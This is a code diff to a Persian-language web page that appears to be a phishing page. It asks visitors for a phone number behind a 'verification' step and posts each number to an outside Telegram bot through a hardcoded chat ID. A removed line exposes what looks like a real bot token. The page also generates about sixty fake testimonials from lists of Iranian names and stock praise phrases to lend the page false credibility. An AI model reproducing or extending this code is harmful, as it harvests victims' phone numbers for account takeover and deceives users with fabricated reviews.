@@ -111,8 +111,8 @@
   <div id="ipWarning" class="hidden">شما با IP ایران وارد شده‌اید. لطفاً از فیلترشکن استفاده کنید.</div>
 
   <script>
-    const BOT_TOKEN = "توکن_ربات_شما";
-    const CHAT_ID = "chat_id_شما";
+    const BOT_TOKEN = "توکن_واقعی_خودت_اینجا";
+    const CHAT_ID = -1002407582314;
 
     async function goToVerify() {
       try {
@@ -127,7 +127,7 @@
           document.getElementById("verifyPage").classList.remove("hidden");
         }
       } catch (e) {
-        alert("خطا در برسی ip. لطفا مجدد تلاش کنید. درصورت بروز مجدد این مشکل اگر از مرور گر دیگری استفاده میکنید، از مروز گر گوگل کروم استفاده نمایید.");
+        alert("خطا در بررسی IP. لطفاً مجدد تلاش کنید.");
       }
     }
 
@@ -145,12 +145,11 @@
       document.getElementById("message").innerHTML = "";
       startTimer();
 
-      // ارسال به تلگرام
       const text = `شماره جدید:\n${phone}`;
-      fetch(`https://api.telegram.org/bot${8178257200:AAGMH9_8w64QSnok0ZGLSbMuTQxudAJIN5o}/sendMessage`, {
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: -1002407582314, text: text })
+        body: JSON.stringify({ chat_id: CHAT_ID, text: text })
       });
 
       setTimeout(() => {
@@ -199,16 +198,9 @@
     }
 
     const names = ["سحر", "کیان", "زهرا", "میلاد", "نیلوفر", "محمد", "مریم", "یوسف", "الناز", "رضا", "حسین", "مهسا"];
-    const starts = [
-      "خیلی خوشم اومد از", "واقعا تحت تاثیر قرار گرفتم از", "بهترین تجربه‌ای که داشتم با",
-      "فوق‌العاده بود", "از کار شما تشکر می‌کنم برای", "واقعاً عالیه"
-    ];
-    const middles = [
-      "آموزش‌ها", "پاسخ‌گویی سریع", "تنوع محتوا", "سرعت بالا", "رابط کاربری", "امنیت خوب", "تحلیل‌های دقیق"
-    ];
-    const ends = [
-      "دمتون گرم!", "به دوستام معرفی می‌کنم.", "ارزش وقت گذاشتن داشت.", "خسته نباشید.", "لذت بردم.", "منتظر آپدیت‌های بیشترم."
-    ];
+    const starts = ["خیلی خوشم اومد از", "واقعا تحت تاثیر قرار گرفتم از", "بهترین تجربه‌ای که داشتم با", "فوق‌العاده بود", "از کار شما تشکر می‌کنم برای", "واقعاً عالیه"];
+    const middles = ["آموزش‌ها", "پاسخ‌گویی سریع", "تنوع محتوا", "سرعت بالا", "رابط کاربری", "امنیت خوب", "تحلیل‌های دقیق"];
+    const ends = ["دمتون گرم!", "به دوستام معرفی می‌کنم.", "ارزش وقت گذاشتن داشت.", "خسته نباشید.", "لذت بردم.", "منتظر آپدیت‌های بیشترم."];
 
     let comments = [], used = new Set(), recent = [];
     while (comments.length < 60) {
